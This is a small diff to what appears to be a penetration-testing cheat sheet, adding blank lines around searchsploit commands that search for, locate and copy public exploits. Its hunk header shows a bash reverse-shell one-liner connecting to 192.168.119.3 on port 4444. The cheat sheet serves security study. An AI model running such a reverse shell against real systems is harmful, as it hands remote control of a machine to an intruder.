@@ -724,8 +724,10 @@ bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
 
 ~~~ bash
 searchsploit [keyword]
+
 # Show the full path to an exploit
 searchsploit -p [EDB-ID]
+
 # Mirror (aka copies) an exploit to the current working directory
 searchsploit -m [EDB-ID]
 ~~~
